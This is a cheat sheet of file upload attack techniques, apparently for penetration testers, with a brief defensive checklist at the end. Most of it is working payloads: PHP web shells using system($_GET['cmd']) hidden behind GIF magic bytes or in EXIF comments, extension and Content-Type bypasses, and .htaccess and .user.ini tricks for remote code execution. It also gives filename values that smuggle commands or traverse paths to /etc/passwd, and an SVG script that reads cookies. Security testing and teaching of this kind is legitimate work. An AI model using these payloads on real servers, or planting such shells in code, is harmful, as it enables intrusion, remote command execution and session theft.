# File Upload Vulnerabilities: 2026 Complete Reference

## Bypass Techniques

### Extension Bypass
| Blocked | Bypass |
|---------|--------|
| .php | .php3, .php4, .php5, .phtml, .pht, .phar |
| .jsp | .JSP, .jspx, .jsw, .jsv |
| .exe | .exe, .exe (double extension) |
| All scripts | Test .user.ini, .htaccess first |
| .pl | .cgi |

### Double Extension
- `shell.php.jpg` — some parsers see .jpg and allow
- `shell.jpg.php` — Apache `AddType` might read .php
- `file.php;.jpg` — null byte injection (old but test)
- `file.php%00.jpg` — null byte URL encoded

### Content-Type Spoofing
```http
Content-Type: image/jpeg
--actual content is PHP shell--
```
Server only checks Content-Type header, not actual file content.

### Magic Byte Injection
```php
// GIF89a prefix makes file look like GIF
GIF89a<?php system($_GET['cmd']); ?>
```

### ImageTrick (Polyglot)
```bash
# PHP shell in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

## Detection

### Metacharacter Injection
Test filenames for path traversal and command injection:
- `../../../etc/passwd`
- `file$(whoami).txt`
- `` file`whoami`.txt ``
- `file||whoami`

### Upload to RCE
1. Upload .htaccess with `AddType application/x-httpd-php .txt`
2. Upload .user.ini with `auto_prepend_file=shell.txt`
3. Upload webshell → find exact path (timestamp in response, /u/p/l/o/a/d/)
4. Race condition: upload before delete script runs

### SVG/XSS
SVG files allowed for images:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.cookie)</script>
</svg>
```

## Tooling
- **Burp Upload Scanner**: Automated file upload testing
- **fuxploider**: Blind file upload fuzzing
- **exiftool**: Manipulate EXIF/metadata for polyglot creation

## Defensive Checklist
1. Whitelist extensions (never blacklist)
2. Validate magic bytes + Content-Type (not MIME alone)
3. Store files outside webroot
4. Serve uploaded files via proxy script (not directly)
5. Rename files on upload — strip original name
6. Disable execution in upload directory